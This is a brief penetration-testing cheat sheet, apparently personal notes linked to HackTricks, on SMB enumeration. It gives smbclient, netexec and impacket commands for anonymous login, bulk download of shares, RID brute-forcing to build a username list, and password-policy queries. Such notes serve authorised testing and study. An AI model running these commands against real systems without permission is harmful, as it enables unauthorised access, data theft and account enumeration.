<https://book.hacktricks.xyz/pentesting/pentesting-smb>

Anonymous log in
smbclient -N  "//$target/Public/"
smbclient "//$target/Public/"

Recursively Grab files
prompt off
recurse on
mget *

Share overview:
netexec smb $target -u 'guest' -p '' --shares
netexec smb $target -u 'guest' -p '' --shares --spider NETLOGON --regex .

Download everything except default shares:
netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'

Grabs only usernames
rid brute:
netexec smb $target -u 'guest' -p '' --rid-brute
netexec smb $target -u '' -p '' --rid-brute
netexec smb $target -u 'guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee userlist2.txt

Password policy:
netexec smb $target --pass-pol

Using impacket-smbclient:
impacket-smbclient domain.name/bob:'test123'@$target
use share_name

Trick: (This basically downloads everything at once, much faster than get. Dont trust it yet tho:)))
prompt off
recurse on
mget *

or

mask
recurse
prompt
mget *